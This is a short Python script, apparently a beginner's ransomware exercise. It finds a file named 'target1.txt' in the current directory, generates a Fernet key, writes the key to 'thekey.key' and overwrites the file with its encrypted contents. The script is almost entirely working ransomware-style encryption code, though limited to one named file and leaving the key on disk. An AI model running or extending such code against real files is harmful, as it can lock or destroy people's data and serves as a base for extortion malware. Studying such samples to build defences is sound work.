#!/usr/bin/env  python3
import os 
from cryptography.fernet import Fernet

files=[]
for directory in os.listdir():
        if directory == "target1.txt":
                
                files.append(directory)
print(files)

key= Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
        thekey.write(key)
for directory in files:
        with open(directory, "rb") as thedirectory:
                contenta= thedirectory.read()
        content_enkripsi = Fernet(key).encrypt(contenta)
        with open(directory, "wb") as thedirectory:
                thedirectory.write(content_enkripsi)


